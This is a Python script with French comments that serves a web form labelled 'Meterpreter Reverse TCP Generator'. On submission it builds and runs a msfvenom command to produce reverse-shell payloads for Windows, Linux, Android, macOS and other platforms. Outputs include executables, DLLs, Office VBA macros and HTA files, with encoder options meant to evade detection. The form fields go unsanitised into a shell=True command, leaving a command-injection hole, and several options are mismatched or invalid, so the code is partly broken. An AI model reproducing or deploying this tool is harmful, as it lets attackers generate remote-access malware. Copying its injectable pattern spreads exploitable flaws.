import http.server
import socketserver
import os
import subprocess

# Définition du répertoire racine du site web
ROOT_DIR = os.path.dirname(os.path.abspath(__file__))

# Définition du port et de l'hôte pour le serveur web
HOST = '192.168.1.128'  # or HOST = '<your_public_ip_address>'
PORT = 8000

# ...


# Définition du template HTML pour le formulaire
# ...

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Meterpreter Reverse TCP Generator</title>
    <style>
        body {
            font-family: Arial, sans-serif;
        }
        form {
            width: 50%;
            margin: 40px auto;
            padding: 20px;
            border: 1px solid #ccc;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        label {
            display: block;
            margin-bottom: 10px;
        }
        input[type="text"] {
            width: 100%;
            height: 30px;
            margin-bottom: 20px;
            padding: 10px;
            border: 1px solid #ccc;
        }
        select {
            width: 100%;
            height: 200px; /* adjust the height to your liking */
            overflow-y: auto; /* add scrollbar */
            padding: 10px;
            border: 1px solid #ccc;
        }
        button[type="submit"] {
            background-color: #4CAF50;
            color: #fff;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button[type="submit"]:hover {
            background-color: #3e8e41;
        }
    </style>
</head>
<body>
    <form action="" method="post">
        <label for="lhost">LHOST:</label>
        <input type="text" id="lhost" name="lhost" required><br><br>
        <label for="lport">LPORT:</label>
        <input type="text" id="lport" name="lport" required><br><br>
        <label for="payload">Payload:</label>
        <select id="payload" name="payload" required size="10"> <!-- adjust the size to your liking -->
            <option value="windows/meterpreter/reverse_tcp">Windows Meterpreter Reverse TCP</option>
            <option value="linux/meterpreter/reverse_tcp">Linux Meterpreter Reverse TCP</option>
            <option value="osx/meterpreter/reverse_tcp">macOS Meterpreter Reverse TCP</option>
            <option value="android/meterpreter/reverse_tcp">Android Meterpreter Reverse TCP</option>
            <option value="ios/meterpreter/reverse_tcp">iOS Meterpreter Reverse TCP</option>
            <option value="chromeos/meterpreter/reverse_tcp">Chrome OS Meterpreter Reverse TCP</option>
            <option value="bsd/meterpreter/reverse_tcp">BSD Meterpreter Reverse TCP</option>
            <option value="solaris/meterpreter/reverse_tcp">Solaris Meterpreter Reverse TCP</option>
        </select><br><br>
        <label for="output">Output format:</label>
        <select id="output" name="output" required size="10"> <!-- adjust the size to your liking -->
            <option value="raw">Raw</option>
            <option value="exe">Executable (Windows)</option>
            <option value="elf">Executable (Linux)</option>
            <option value="dll">Dynamic Link Library (Windows)</option>
            <option value="so">Shared Object (Linux)</option>
            <option value="vba">VBA Macro (Office)</option>
            <option value="hta">HTA Application (Windows)</option>
            <option value="js">JavaScript (Web)</option>
            <option value="py">Python Script</option>
            <option value="rb">Ruby Script</option>
            <option value="perl">Perl Script</option>
            <option value="php">PHP Script</option>
        </select><br><br>
        <label for="obfuscation">Obfuscation:</label>
        <select id="obfuscation" name="obfuscation" required size="5"> <!-- adjust the size to your liking -->
            <option value="none">None</option>
            <option value="base64">Base64 encoding</option>
            <option value="xor">XOR encoding</option>
            <option value="shikata_ga_nai">Shikata Ga Nai obfuscation</option>
        </select><br><br>
        <button type="submit">Generate Meterpreter</button>
    </form>
    <div id="output"></div>
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            document.querySelector("form").addEventListener("submit", function(event) {
                event.preventDefault();
                                var lhost = document.querySelector("#lhost").value;
                var lport = document.querySelector("#lport").value;
                var payload = document.querySelector("#payload").value;
                var output = document.querySelector("#output").value;
                var obfuscation = document.querySelector("#obfuscation").value;
                var xhr = new XMLHttpRequest();
                xhr.open("POST", "", true);
                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                xhr.send("lhost=" + lhost + "&lport=" + lport + "&payload=" + payload + "&output=" + output + "&obfuscation=" + obfuscation);
                xhr.onload = function() {
                    if (xhr.status === 200) {
                        document.querySelector("#output").innerHTML = xhr.responseText;
                    } else {
                        document.querySelector("#output").innerHTML = "Error: " + xhr.statusText;
                    }
                };
            });
        });
    </script>
</body>
</html>'''


class WebServer(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(HTML_TEMPLATE.encode())

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode()
        lhost, lport, payload, output, obfuscation = post_data.split("&")
        lhost = lhost.split("=")[1]
        lport = lport.split("=")[1]
        payload = payload.split("=")[1]
        output = output.split("=")[1]
        obfuscation = obfuscation.split("=")[1]

        # Génération du Meterpreter Reverse TCP avec Metasploit
        msfvenom_cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {output} -O payload"
        if obfuscation == "base64":
            msfvenom_cmd += " -e x86/shikata_ga_nai"
        elif obfuscation == "xor":
            msfvenom_cmd += " -e x86/xor"
        elif obfuscation == "shikata_ga_nai":
            msfvenom_cmd += " -e x86/shikata_ga_nai"
        else:
            msfvenom_cmd += " -e x86/none"

        # Exécution de la commande msfvenom
        output = subprocess.check_output(msfvenom_cmd, shell=True)

        # Envoi de la réponse au client
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(output)


if __name__ == "__main__":
    server_address = (HOST, PORT)
    httpd = http.server.HTTPServer(server_address, WebServer)
    print(f"Serveur web : http://{HOST}:{PORT}")
    httpd.serve_forever()

